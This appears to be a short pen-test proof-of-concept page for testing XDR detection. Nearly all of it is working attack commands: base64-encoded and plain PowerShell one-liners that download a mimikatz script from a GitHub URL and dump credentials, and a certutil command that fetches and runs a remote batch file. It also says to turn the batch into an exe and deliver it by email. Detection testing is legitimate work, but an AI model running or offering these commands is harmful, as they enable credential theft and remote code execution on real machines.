# Pen-test proof of concept code 

## converting to Base64 encoded string
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 

## running the encoded command with powershell
powershell.exe -encoded $Encoded

## mimikatz powershell encoded.bat win10 compatible, disable behavior monitoring to test xdr, open admin cmd prompt and paste code below
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAGEAYwBrAGMAbwAvAHAAbwBjAC8AbQBhAHMAdABlAHIALwBtAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAuAHQAeAB0ACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsA

##mimikatz version tls 1.2
powershell -enc WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABhAGMAawBjAG8ALwBwAG8AYwAvAG0AYQBzAHQAZQByAC8AbQBpAG0AaQBrAGEAdAB6AC4AcABzADEALgB0AHgAdAAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQA=

## original mimikatz powershell not encode win10 compatible, open admin cmd prompt and paste code below
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/chackco/poc/master/mimikatz.ps1.txt'); $m = Invoke-Mimikatz -DumpCreds; $m

## original version tls1.2
powershell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/chackco/poc/master/mimikatz.ps1.txt'); $m = Invoke-Mimikatz -DumpCreds; $m


## test xdr 2, open admin cmd prompt and paste code below
certutil.exe -urlcache -f https://raw.githubusercontent.com/chackco/poc/master/testxdr.bat.txt c:\testxdr.bat && c:\testxdr.bat

## you can mix and match like
save above command as batch/ convert to exe and send using email
after open email > save file and run batch/exe to test email module

https://raw.githubusercontent.com/chackco/poc/master/testxdr-loader.exe.txt

rename to exe and run
